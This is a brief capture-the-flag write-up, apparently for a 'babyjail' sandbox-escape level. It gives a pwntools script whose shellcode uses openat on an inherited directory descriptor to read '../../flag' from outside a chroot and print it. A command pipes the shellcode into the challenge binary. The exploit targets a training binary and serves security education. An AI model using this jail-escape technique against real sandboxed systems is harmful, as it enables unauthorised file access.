
using only openat, read, write. read contents to the shellcode buf which is 4K, read at begin +1K
scripts:   
```
from pwn import *
context(log_level = 'info', arch = 'amd64', os = 'linux')
shellcode=shellcraft.openat(3, "../../flag")
shellcode+=shellcraft.read(4, 0x13373e8, 0x100)
shellcode+=shellcraft.write(1, 0x13373e8, 0x100)
shellcode=asm(shellcode)
sys.stdout.buffer.write(shellcode)
```
`python3 resolve.py | /challenge/babyjail_level3 /home/hacker/`
